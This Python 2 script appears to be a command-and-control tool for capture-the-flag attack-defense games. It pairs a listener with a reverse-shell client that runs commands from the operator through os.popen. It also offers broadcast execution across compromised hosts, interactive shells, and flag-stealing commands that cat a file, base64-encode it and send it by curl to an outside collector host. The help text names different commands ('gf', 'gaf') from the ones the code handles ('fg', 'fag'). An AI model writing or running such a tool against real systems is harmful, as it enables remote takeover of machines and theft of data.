# -*- coding: utf-8 -*-

import socket
import threading
import time
import hashlib
import sys
import os
import readline

slaves = {}

MAX_CONNECTION_NUMBER = 0x10

def md5(data):
    return hashlib.md5(data).hexdigest()

def recvuntil(p, target):
    data = ""
    while target not in data:
        data += p.recv(1)
    return data

def recvall(socket_fd):
    data = ""
    size = 0x10
    while True:
        r = socket_fd.recv(size)
        data += r
        if len(r) < size:
            break
    return data

def slaver(host, port, fake):
    slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    slaver_fd.connect((host, port))
    banner = "[FakeTerminal] >> "
    while True:
        command = recvuntil(slaver_fd, "\n")
        if fake:
            slaver_fd.send(banner)
        # print "[+] Executing : %r" % (command)
        try:
            result = os.popen(command).read()
        except:
            result = ""
        slaver_fd.send(command + result)
    print "[+] Closing connection..."
    slaver_fd.shutdown(socket.SHUT_RDWR)
    slaver_fd.close()

def transfer(h):
    slave = slaves[h]
    socket_fd = slave.socket_fd
    buffer_size = 0x400
    interactive_stat = True
    while True:
        if not slave.interactive:
            interactive_stat = False
        buffer = socket_fd.recv(buffer_size)
        if not slave.interactive:
            interactive_stat = False
        if not buffer:
            if not slave.interactive:
                interactive_stat = False
            print "[+] No data, breaking..."
            break
        if not slave.interactive:
            interactive_stat = False
        sys.stdout.write(buffer)
        print ""
        if not interactive_stat:
            break
    if interactive_stat:
        print "[-] Unexpected EOF!"
        socket_fd.shutdown(socket.SHUT_RDWR)
        socket_fd.close()
        slave.remove_node()
    else:
        print "[+] Exiting interactive shell..."
        return

class Slave():
    def __init__(self, socket_fd):
        self.socket_fd = socket_fd
        self.hostname, self.port = socket_fd.getpeername()
        self.node_hash = node_hash(self.hostname, self.port)
        self.interactive = False
        # self.banner = self.read_banner()
        # slave_fd.shutdown(socket.SHUT_RDWR)
        # slave_fd.close()

    def read_banner(self):
        return recvall(self.socket_fd)

    def show_info(self):
        print "[+] Hash : %s" % (self.node_hash)
        print "[+] IP : %s" % (self.hostname)
        print "[+] Port : %s" % (self.port)

    def send_command(self, command):
        try:
            self.socket_fd.send(command + "\n")
            return True
        except:
            self.remove_node()
            return False

    def send_command_print(self, command):
        self.send_command(command)
        time.sleep(0.125)
        print "[+] Executing : %s" % (command)
        result = recvall(self.socket_fd)
        print "[%s]" % ("-" * 32)
        print result

    def interactive_shell(self):
        self.interactive = True
        t = threading.Thread(target=transfer, args=(self.node_hash, ))
        t.start()
        try:
            while True:
                command = raw_input() or ("exit")
                if command == "exit":
                    break
                self.socket_fd.send(command + "\n")
        except:
            self.remove_node()
        self.interactive = False

    def remove_node(self):
        print "[+] Removing Node!"
        slaves.pop(self.node_hash)

def master(host, port):
    print "[+] Master starting at %s:%d" % (host, port)
    master_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    master_fd.bind((host, port))
    master_fd.listen(MAX_CONNECTION_NUMBER)
    while(True):
        slave_fd, slave_addr = master_fd.accept()
        print "[+] Slave online : %s:%d" % (slave_addr[0], slave_addr[1])
        repeat = False
        for i in slaves.keys():
            slave = slaves[i]
            if slave.hostname == slave_addr[0]:
                repeat = True
                break
        if repeat:
            print "[+] Detect the same host connection, reseting..."
            slave_fd.shutdown(socket.SHUT_RDWR)
            slave_fd.close()
        else:
            print "[+] New node add to online list..."
            slave = Slave(slave_fd)
            slaves[slave.node_hash] = slave

def show_commands():
    print "Commands : "
    print "        0. [h|help|?|\\n] : show this help"
    print "        1. [l] : list all online slaves"
    print "        2. [p] : print position info"
    print "        3. [i] : interactive shell"
    print "        4. [g] : goto a slave"
    print "        5. [ ] : port forwarding (Under developing...)"
    print "        6. [gf] : get flag"
    print "        7. [gaf] : get all flag"
    print "        8. [c] : command for all"
    print "        9. [q|quit|exit] : interact an shell"

def node_hash(host, port):
    return md5("%s:%d" % (host, port))

def main():
    if len(sys.argv) != 3:
        print "Usage : "
        print "\tpython master.py [HOST] [PORT]"
        exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    print "[+] Initing..."
    master_thread = threading.Thread(target=master, args=(host, port,))
    slaver_thread = threading.Thread(target=slaver, args=(host, port, True,))
    master_thread.start()
    slaver_thread.start()
    time.sleep(1)
    show_commands()
    position = slaves[slaves.keys()[0]].node_hash # master himself
    while True:
        command = raw_input("=>") or "h"
        if command.startswith("#"):
            continue
        if command == "h" or command == "help" or command == "?" or command == "\n":
            show_commands()
        elif command == "l":
            print "[+] Listing online slaves..."
            for key in slaves.keys():
                print "[>>>> %s <<<<]" % (key)
                slaves[key].show_info()
        elif command == "p":
            slaves[position].show_info()
        elif command == "c":
            command = raw_input("Input command (uname -r) : ") or ("uname -r")
            for i in slaves.keys():
                slave = slaves[i]
                print "[+] Command : %s" % (command)
                result = slave.send_command_print(command)
        elif command == "g":
            input_node_hash = raw_input("[+] Please input target node hash : ") or position
            print "[+] Input node hash : %s" % (repr(input_node_hash))
            if input_node_hash == position:
                print "[+] Position will not change!"
                continue
            found = False
            for key in slaves.keys():
                if key.startswith(input_node_hash):
                    # old_slave = slaves[position]
                    new_slave = slaves[key]
                    # print "[+] Changing position from [%s:%d] to [%s:%d]" % (old_slave.hostname, old_slave.port, new_slave.hostname, new_slave.port)
                    print "[+] Changing position to [%s:%d]" % (new_slave.hostname, new_slave.port)
                    position = key
                    found = True
                    break
            if not found:
                print "[-] Please check your input node hash!"
                print "[-] Position is not changed!"
        elif command == "fag":
            flag_path = raw_input("Input flag path (/flag.txt) : ") or ("/flag.txt")
            box_host = raw_input("Input flag box host (192.168.187.128) : ") or ("192.168.187.128")
            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
            for i in slaves.keys():
                slave = slaves[i]
                command = "FLAG=`cat %s | base64`" % (flag_path)
                print "[+] Command : %s" % (command)
                result = slave.send_command(command)
                command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (box_host, box_port)
                print "[+] Command : %s" % (command)
                result = slave.send_command(command)
                if result:
                    print "[+] Flag is sent to you!"
                else:
                    # slave.remove_node()
                    print "[-] Executing command failed! Connection aborted! Node removed!"
                    position = slaves.keys()[0]
                    print "[+] Position changed to : %s" % (position)
        elif command == "fg":
            slave = slaves[position]
            flag_path = raw_input("Input flag path (/flag.txt) : ") or ("/flag.txt")
            box_host = raw_input("Input flag box host (192.168.187.128) : ") or ("192.168.187.128")
            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
            command = "FLAG=`cat %s | base64`" % (flag_path)
            print "[+] Command : %s" % (command)
            result = slave.send_command(command)
            command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (box_host, box_port)
            print "[+] Command : %s" % (command)
            result = slave.send_command(command)
            if result:
                print "[+] Flag is sent to you!"
            else:
                # slave.remove_node()
                print "[-] Executing command failed! Connection aborted! Node removed!"
                position = slaves.keys()[0]
                print "[+] Position changed to : %s" % (position)
        elif command == "i":
            slave = slaves[position]
            slave.interactive_shell()
        elif command == "q" or command == "quit" or command == "exit":
            # TODO : release all resources before closing
            print "[+] Releasing resources..."
            for key in slaves.keys():
                slave = slaves[key]
                print "[+] Closing conntion of %s:%d" % (slave.hostname, slave.port)
                slave.socket_fd.shutdown(socket.SHUT_RDWR)
                slave.socket_fd.close()
            print "[+] Exiting..."
            exit(0)
        else:
            print "[-] Please check your input!"

if __name__ == "__main__":
    main()
